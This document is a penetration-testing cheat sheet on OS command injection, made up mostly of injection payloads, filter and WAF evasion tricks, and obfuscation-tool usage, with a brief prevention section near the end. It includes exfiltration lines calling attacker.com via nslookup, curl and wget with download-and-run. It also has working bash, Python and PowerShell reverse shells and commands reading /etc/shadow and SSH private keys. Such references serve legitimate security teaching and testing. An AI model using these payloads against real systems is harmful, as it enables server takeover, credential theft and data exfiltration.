# Command Injection

## Command Injection

### Overview

**Command Injection** (also known as OS Command Injection or Shell Injection) is a critical web security vulnerability that allows attackers to execute arbitrary operating system commands on the server hosting an application. This occurs when user-supplied input is passed to system shell commands without proper sanitization.

**Why it's dangerous:**

* Complete server compromise possible
* Direct OS-level access
* Can lead to full system takeover
* Difficult to detect with standard WAFs
* Often results in data breaches

**Common vulnerable functions:**

**PHP:**

```php
exec(), system(), shell_exec(), passthru(), popen()
```

**Node.js:**

```javascript
child_process.exec(), child_process.spawn()
```

**Python:**

```python
os.system(), subprocess.call(), subprocess.Popen()
```

**Impact:**

* Complete server takeover
* Data exfiltration
* Malware installation
* Lateral movement
* Privilege escalation
* Denial of service

***

### Exploitation Workflow Summary

```
1. Identification & Discovery
   ├─ Locate input parameters
   ├─ Identify OS interaction points
   ├─ Test for command execution
   └─ Determine OS type (Linux/Windows)

2. Initial Testing
   ├─ Basic injection operators (;, |, &&)
   ├─ Time-based detection (sleep, ping)
   ├─ Output-based detection (whoami, id)
   └─ Blind injection techniques

3. Filter Bypass
   ├─ Character encoding
   ├─ Space bypass techniques
   ├─ Command obfuscation
   └─ WAF evasion

4. Exploitation
   ├─ Data extraction
   ├─ Reverse shell deployment
   ├─ Privilege escalation
   └─ Persistence establishment

5. Advanced Techniques
   ├─ Encoded payloads
   ├─ Case manipulation
   ├─ Environment variable abuse
   └─ Automated obfuscation tools
```

***

### Understanding Command Injection

#### How It Works

**Vulnerable PHP code:**

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

**Normal usage:**

```
GET /script.php?filename=invoice
Executes: touch /tmp/invoice.pdf
```

**Malicious usage:**

```
GET /script.php?filename=test; whoami
Executes: touch /tmp/test.pdf; whoami
Result: Creates file AND executes whoami
```

**Vulnerable Node.js code:**

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

**Exploitation:**

```
GET /createfile?filename=test; cat /etc/passwd
```

***

### Vulnerable Parameters

#### Common Parameter Names

These parameter names often indicate command injection points:

```
?cmd=
?exec=
?command=
?execute=
?ping=
?query=
?jump=
?code=
?reg=
?do=
?func=
?arg=
?option=
?load=
?process=
?step=
?read=
?function=
?req=
?feature=
?exe=
?module=
?payload=
?run=
?print=
```

**Testing strategy:**

```bash
# Identify functionality that likely executes commands
- Ping utilities
- Network diagnostics
- File operations
- System information pages
- Backup/restore features
- Image processing
```

***

### Injection Operators

#### Basic Operators Table

| Operator   | Symbol  | URL-Encoded | Behavior                               | OS    |
| ---------- | ------- | ----------- | -------------------------------------- | ----- |
| Semicolon  | `;`     | `%3b`       | Executes both commands sequentially    | Both  |
| New Line   | `\n`    | `%0a`       | Executes both commands                 | Both  |
| Background | `&`     | `%26`       | Executes both (async)                  | Both  |
| Pipe       | `\|`    | `%7c`       | Passes first output to second          | Both  |
| AND        | `&&`    | `%26%26`    | Executes second only if first succeeds | Both  |
| OR         | `\|\|`  | `%7c%7c`    | Executes second only if first fails    | Both  |
| Sub-Shell  | `` ` `` | `%60%60`    | Command substitution                   | Linux |
| Sub-Shell  | `$()`   | `%24%28%29` | Command substitution                   | Linux |

#### Operator Examples

**Semicolon (sequential execution):**

```bash
# Original: ping -c 1 127.0.0.1
# Injected: ping -c 1 127.0.0.1; whoami

Result:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms
root
```

**AND operator (conditional):**

```bash
# Executes second only if first succeeds
ping -c 1 127.0.0.1 && whoami
```

**OR operator (conditional):**

```bash
# Executes second only if first fails
ping -c 1 INVALID || whoami
```

**Pipe (redirect output):**

```bash
# First command output feeds into second
cat /etc/passwd | grep root
```

**Sub-shell (command substitution):**

```bash
# Linux only
echo $(whoami)
echo `whoami`
```

***

### Detection Techniques

#### Time-Based Detection

**Why use time-based?** When command output isn't visible in responses, time delays prove execution.

**Basic sleep test:**

```bash
; sleep 5
```

**URL-encoded:**

```
%3b%20sleep%205
```

**Testing:**

```bash
# Measure response time
time curl "http://target.com/ping.php?ip=127.0.0.1;sleep%205"

# If takes ~5 seconds, injection confirmed
```

**Platform-specific:**

```bash
# Linux
; sleep 10

# Windows
& timeout /t 10

# Cross-platform ping
& ping -c 10 127.0.0.1   # Linux
& ping -n 10 127.0.0.1   # Windows
```

#### Output-Based Detection

**Basic commands:**

```bash
; whoami
; id
; uname -a
; hostname
```

**File reading:**

```bash
; cat /etc/passwd
; cat /etc/shadow
; type C:\Windows\win.ini
```

#### Blind Detection

**Out-of-band (OAST):**

```bash
; nslookup attacker.com
; curl http://attacker.com
; wget http://attacker.com

# With data exfiltration
; nslookup $(whoami).attacker.com
; curl http://attacker.com/$(whoami)
```

***

### Basic Exploitation

#### Simple Injection

**Vulnerable endpoint:**

```
http://target.com/ping.php?ip=127.0.0.1
```

**Test payload:**

```
http://target.com/ping.php?ip=127.0.0.1;whoami
```

**URL-encoded version:**

```
http://target.com/ping.php?ip=127.0.0.1%3bwhoami
```

**Expected response includes:**

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
...
www-data
```

#### Chaining Commands

**Multiple commands:**

```bash
# Execute three commands
127.0.0.1; whoami; id; hostname
```

**URL-encoded:**

```
127.0.0.1%3b%20whoami%3b%20id%3b%20hostname
```

#### Data Exfiltration

**Read sensitive files:**

```bash
127.0.0.1; cat /etc/passwd
127.0.0.1; cat /etc/shadow
127.0.0.1; cat ~/.ssh/id_rsa
```

**Windows:**

```cmd
127.0.0.1 & type C:\Users\Administrator\Desktop\flag.txt
```

***

### Bypassing Filters

#### Space Filter Bypass

**Problem:** Spaces are blacklisted

**Solution 1: Tab character (`%09`):**

```bash
127.0.0.1%0a%09whoami
```

**Solution 2: `${IFS}` (Internal Field Separator):**

```bash
127.0.0.1;cat${IFS}/etc/passwd
```

**Solution 3: Brace expansion:**

```bash
{cat,/etc/passwd}
```

**Example:**

```bash
# Without spaces
cat /etc/passwd

# With tab
cat%09/etc/passwd

# With IFS
cat${IFS}/etc/passwd

# With brace expansion
{cat,/etc/passwd}
```

#### Slash Filter Bypass

**Using environment variables (Linux):**

```bash
# Extract first character of $PATH (which is "/")
echo ${PATH:0:1}
# Output: /

# Use in command
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
# Equivalent to: cat /etc/passwd
```

**Extract other characters:**

```bash
# Get semicolon from $LS_COLORS
echo ${LS_COLORS:10:1}
# Output: ;

# Use in injection
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
# Equivalent to: 127.0.0.1; whoami
```

**Windows slashes:**

```cmd
# CMD
echo %HOMEPATH:~6,-11%
# Output: \

# PowerShell
$env:HOMEPATH[0]
# Output: \
```

#### Command Obfuscation

**Quote insertion (Linux & Windows):**

```bash
# Original
whoami

# With single quotes
w'h'o'a'm'i

# With double quotes
w"h"o"a"m"i

# Mixed
who'am'i
```

**Why it works:** Shells ignore quotes within commands, so `w'h'o'a'm'i` = `whoami`

**Backslash (Linux only):**

```bash
w\ho\am\i
```

**Positional parameter (Linux only):**

```bash
who$@ami
```

**Caret (Windows only):**

```cmd
who^ami
```

***

### Advanced Bypass Techniques

#### Case Manipulation

**Why it works:**

* Command names are case-insensitive in Windows
* Can bypass exact string matching filters

**Windows:**

```powershell
WhOaMi
```

**Linux (with conversion):**

```bash
# Convert uppercase to lowercase
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# Alternative
$(a="WhOaMi";printf %s "${a,,}")
```

#### Reversed Commands

**Linux:**

```bash
# Reverse string
echo 'whoami' | rev
# Output: imaohw

# Execute reversed string
$(rev<<<'imaohw')
# Executes: whoami
```

**Complete payload:**

```bash
127.0.0.1;$(rev<<<'imaohw')
```

**Windows PowerShell:**

```powershell
# Reverse string
"whoami"[-1..-20] -join ''

# Execute
iex "$('imaohw'[-1..-20] -join '')"
```

#### Base64 Encoding

**Linux encoding:**

```bash
# Encode command
echo -n 'cat /etc/passwd' | base64
# Output: Y2F0IC9ldGMvcGFzc3dk

# Execute encoded command
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```

**Complete payload (with space bypass):**

```bash
127.0.0.1;bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)
```

**Why `<<<` instead of `|`:**

* Pipe `|` might be filtered
* `<<<` (here-string) achieves same result

**Windows PowerShell:**

```powershell
# Encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# Output: dwBoAG8AYQBtAGkA

# Decode and execute
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

**Cross-platform encoding:**

```bash
# Ensure UTF-16LE encoding for Windows
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

#### Character Shifting

**Generate characters from other characters:**

```bash
# Generate backslash from other characters
echo $(tr '!-}' '"-~'<<<[)
# Output: \

# Generate semicolon
echo $(tr '[' ';'<<<[)
# Output: ;
```

**Usage in payload:**

```bash
127.0.0.1$(tr '[' ';'<<<[)whoami
# Equivalent to: 127.0.0.1;whoami
```

***

### Blind Command Injection

#### What is Blind Injection?

**Scenario:**

* Command executes successfully
* No output visible in HTTP response
* Must use alternative detection methods

#### Detection Methods

**1. Time-based (most reliable):**

```bash
; sleep 10
& timeout /t 10
& ping -n 10 127.0.0.1
```

**2. Out-of-band (DNS/HTTP):**

```bash
; nslookup attacker.com
; curl http://attacker.com
```

**3. File-based (if web root accessible):**

```bash
; whoami > /var/www/html/output.txt
```

#### Data Exfiltration via DNS

**Basic DNS exfiltration:**

```bash
; nslookup $(whoami).attacker.com
```

**What happens:**

```
DNS query: www-data.attacker.com
Attacker's DNS logs show: "www-data"
```

**Extract more data:**

```bash
; nslookup $(cat /etc/passwd | base64 | head -c 50).attacker.com
```

#### File-Based Exfiltration

**Write output to accessible location:**

```bash
; whoami > /var/www/html/out.txt
```

**Access via browser:**

```
http://target.com/out.txt
```

**Complete example:**

```bash
# Inject command
; cat /etc/passwd > /var/www/html/passwd.txt

# Retrieve output
curl http://target.com/passwd.txt
```

***

### Reverse Shell Exploitation

#### Linux Reverse Shells

**Bash TCP:**

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

**With injection operator:**

```bash
; bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

**URL-encoded:**

```
%3b%20bash%20-i%20%3E%26%20/dev/tcp/10.10.14.5/4444%200%3E%261
```

**Alternative syntaxes:**

```bash
# Method 2
; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# Method 3 (using exec)
; exec 5<>/dev/tcp/10.10.14.5/4444;cat <&5|while read line; do $line 2>&5 >&5; done
```

**Python reverse shell:**

```bash
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

#### Windows Reverse Shells

**PowerShell:**

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Listener setup:**

```bash
nc -lvnp 4444
```

***

### Automated Fuzzing

#### Burp Suite Cluster Bomb

**Setup:**

**Position 1: Injection operator**

```
ip=127.0.0.1§OPERATOR§§COMMAND§
```

**Payload Set 1 (Operators):**

```
;
%3b
%0a
&
%26
|
%7c
&&
%26%26
||
%7c%7c
```

**Payload Set 2 (Commands):**

```
whoami
w'h'o'a'm'i
who$@ami
w\ho\am\i
$(whoami)
`whoami`
{whoami}
```

**Analysis:**

* Look for different response lengths
* Check for command output in responses
* Note response times (for blind injection)

***

### Evasion Tools

#### Bashfuscator (Linux)

**Installation:**

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

**Basic usage:**

```bash
cd ./bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd'
```

**Output example:**

```bash
${*/+27\[X\(} ...obfuscated_payload...  ${*~}
```

**Controlled obfuscation:**

```bash
# Minimal obfuscation (more reliable)
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

**Output:**

```bash
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
```

**Test locally:**

```bash
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```

#### DOSfuscation (Windows)

**Installation:**

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

**Usage:**

```powershell
# Set command
Invoke-DOSfuscation> SET COMMAND type C:\flag.txt

# Choose encoding
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

**Output:**

```cmd
typ%TEMP:~-3,-2% C:\flag.%TMP:~-13,-12%xt
```

**Test:**

```cmd
typ%TEMP:~-3,-2% C:\flag.%TMP:~-13,-12%xt
```

***

### Comprehensive Payload List

#### Basic Detection Payloads

```bash
;id
;whoami
;uname -a
;hostname
;pwd
;ls -la

& whoami
| whoami
&& whoami
|| whoami

`whoami`
$(whoami)
```

#### Obfuscated Payloads

```bash
# Quote injection
w'h'o'a'm'i
w"h"o"a"m"i

# Backslash
w\ho\am\i

# Positional parameter
who$@ami

# Null statement
wh$()oami

# Echo substitution
who$(echo am)i
who`echo am`i

# Brace expansion
{whoami}

# Space bypass
cat${IFS}/etc/passwd
cat${PATH:0:1}etc${PATH:0:1}passwd

# Multiple techniques combined
c'a't${IFS}${PATH:0:1}e't'c${PATH:0:1}p'a's's'w'd
```

#### File Operation Payloads

```bash
# Read files
;cat /etc/passwd
;cat${IFS}/etc/passwd
;c'a't</etc/passwd
;{cat,/etc/passwd}

# List directories
;ls -la /home
;l's${IFS}-l'a${IFS}/h'o'm'e

# Write files
;echo data > /tmp/file.txt
;whoami > /var/www/html/out.txt
```

***

### Commix Automation

**Installation:**

```bash
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```

**Basic usage:**

```bash
commix --url="http://target.com/page.php?param=value"
```

**Advanced options:**

```bash
# From file
commix -r request.txt

# With authentication
commix --url="http://target.com/page.php?param=value" \
  --cookie="session=abc123"

# Specify OS
commix --url="http://target.com/page.php?param=value" \
  --os=unix

# Crawl and test
commix --url="http://target.com/" --crawl=2
```

***

### Real-World Examples

#### Example 1: Ping Utility

**Vulnerable code:**

```php
<?php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
?>
```

**Exploitation:**

```
http://target.com/ping.php?ip=127.0.0.1;cat%20/etc/passwd
```

#### Example 2: Image Converter

**Vulnerable code:**

```php
<?php
$file = $_POST['filename'];
shell_exec("convert /uploads/$file /processed/$file.jpg");
?>
```

**Exploitation:**

```bash
filename=test.png;wget http://attacker.com/shell.sh -O /tmp/s.sh;bash /tmp/s.sh
```

#### Example 3: DNS Lookup Tool

**Vulnerable code:**

```javascript
app.get("/lookup", function(req, res){
    child_process.exec(`nslookup ${req.query.domain}`);
})
```

**Exploitation:**

```
http://target.com/lookup?domain=google.com;curl%20http://attacker.com/$(whoami)
```

***

### Defense & Prevention

**Input validation:**

* Whitelist allowed characters only
* Reject shell metacharacters: `; | & $ > < \` `\n ( )`
* Use parameter validation libraries
* Implement strict regex patterns

**Secure coding practices:**

```php
// Bad - Direct concatenation
system("ping -c 1 " . $ip);

// Good - Parameterized execution
$escaped = escapeshellarg($ip);
system("ping -c 1 $escaped");

// Better - Avoid shell entirely
exec_without_shell(['ping', '-c', '1', $ip]);
```

**Application-level defenses:**

* Use language-specific safe APIs
* Avoid `system()`, `exec()`, `shell_exec()`
* Use parameterized commands
* Implement command whitelisting
* Run with least privileges
* Use containers for isolation

***

### Quick Reference

#### Detection Checklist

```bash
[ ] Test basic operators (;, |, &&)
[ ] Try time-based detection (sleep)
[ ] Test out-of-band (DNS/HTTP)
[ ] Check for output in response
[ ] Test file-based exfiltration
```

#### Common Bypasses

```bash
# Space
${IFS}
%09
{command,argument}

# Slash
${PATH:0:1}
${HOME:0:1}

# Command
w'h'o'a'm'i
who$@ami
$(rev<<<'imaohw')
```

#### Quick Exploitation

```bash
# Read files
;cat${IFS}/etc/passwd

# Reverse shell
;bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/IP/PORT${IFS}0>&1'

# Data exfiltration
;nslookup${IFS}$(whoami).attacker.com
```

